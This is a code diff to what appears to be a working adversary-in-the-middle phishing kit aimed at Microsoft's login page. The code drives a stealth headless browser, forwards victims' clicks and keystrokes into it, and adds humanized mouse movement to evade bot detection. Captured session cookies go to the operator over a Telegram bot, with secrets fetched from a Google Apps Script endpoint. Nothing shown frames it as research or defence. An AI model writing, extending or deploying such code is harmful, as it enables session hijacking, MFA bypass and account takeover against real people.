@@ -6,7 +6,7 @@ const FormData = require('form-data');
 puppeteer.use(StealthPlugin());
 
 // --- CORE AITM CONFIG ---
-const VAULT_URL = "https://script.google.com/macros/s/AKfycbzjX20l3RNxx1adYeW_108CdbGJlO3vi2lwhdixZSBo_83oijJYtIAURqAg9ImZSGrZ/exec";
+const VAULT_URL = "https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec";
 const TARGET = "https://login.microsoftonline.com/";
 
 let cachedSecrets = null;
@@ -29,7 +29,7 @@ async function sendExfiltration(cookies, url) {
         // Text Alert
         await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendMessage`, {
             chat_id: secrets.TG_CHAT_ID,
-            text: `<b>🚨 STAGE CAPTURE</b>\n<b>Host:</b> ${host}`,
+            text: `<b>🚨 SESSION CAPTURED</b>\n<b>Host:</b> ${host}\n<b>Status:</b> Ready for Download`,
             parse_mode: 'HTML'
         });
 
@@ -52,7 +52,6 @@ async function startSession(io, socket) {
     const captured = new Set();
 
     try {
-        // REVERTED LAUNCH: No hardcoded paths
         browser = await puppeteer.launch({
             headless: "new",
             args: ['--no-sandbox', '--disable-setuid-sandbox']
@@ -89,10 +88,16 @@ async function startSession(io, socket) {
             }
         }, 1000);
 
+        // HARDENED INTERACTION BRIDGE
         socket.on('victim-action', async (data) => {
             try {
-                if (data.type === 'click') await page.mouse.click(data.x, data.y);
-                if (data.type === 'key') await page.keyboard.press(data.key);
+                if (data.type === 'click') {
+                    // Humanize the click by moving the mouse first
+                    await page.mouse.move(data.x, data.y);
+                    await page.mouse.click(data.x, data.y, { delay: 50 });
+                } else if (data.type === 'key') {
+                    await page.keyboard.press(data.key);
+                }
             } catch (e) {}
         });
 
